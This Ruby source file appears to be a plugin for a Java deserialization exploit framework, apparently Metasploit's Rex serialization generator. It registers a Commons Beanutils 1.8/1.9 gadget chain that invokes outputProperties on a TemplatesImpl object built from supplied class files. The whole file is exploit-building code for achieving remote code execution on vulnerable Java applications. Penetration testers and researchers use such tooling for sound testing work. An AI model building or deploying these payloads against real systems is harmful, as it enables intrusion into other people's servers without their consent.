# -*- coding: binary -*-
require_relative '../../payloads/beanutils'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization 
class Beanutils < S::Generator::Gadget
  def id
    'beanutils'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('beanutils')

    return false if !ctx.flag?('beanutils18') && !ctx.flag?('beanutils19')

    unless params.fetch('classfiles', nil).nil?
      # jdk templates + no secmgr
      # or xalan templates
      # required
      return false unless S::Generator::Templates.supported(ctx,params)
    end

    true
  end

  def create(ctx, params: {})
    if ctx.flag?('beanutils18')
      ctx.reg.load('model/beanutils-1.8.json')
    elsif ctx.flag?('beanutils19')
      ctx.reg.load('model/beanutils-1.9.json')
    end

    if !params.fetch('classfiles', nil).nil?
      S::Payloads::Beanutils.make_get_property(
        S::Generator::Templates.make(ctx, params),
        'outputProperties'
      )
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  Beanutils.new
)
